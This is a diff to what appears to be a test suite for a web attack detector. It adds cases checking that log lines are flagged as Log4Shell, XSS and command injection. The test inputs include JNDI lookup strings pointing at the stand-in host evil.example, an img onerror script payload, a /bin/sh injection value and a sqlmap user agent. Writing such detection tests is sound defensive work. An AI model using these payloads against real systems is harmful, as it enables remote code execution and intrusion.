@@ -29,6 +29,18 @@ def test_log4shell():
     assert "web_log4shell" in kinds("GET / HTTP/1.1 header ${jndi:ldap://evil.example/x}")
 
 
+def test_log4shell_obfuscated_lookup_url():
+    assert "web_log4shell" in kinds("User-Agent: ${::-j}${ldap://evil.example/a}")
+
+
+def test_xss_img_onerror_variant():
+    assert "web_xss" in kinds("/?q=<img src=x onerror=alert(1)>")
+
+
+def test_cmdi_bin_sh_variant():
+    assert "web_cmdi" in kinds("/?x=/bin/sh")
+
+
 def test_scanner_user_agent():
     line = '1.2.3.4 - - [t] "GET / HTTP/1.1" 200 1 "-" "sqlmap/1.7#stable"'
     assert "scanner_tool" in kinds(line)
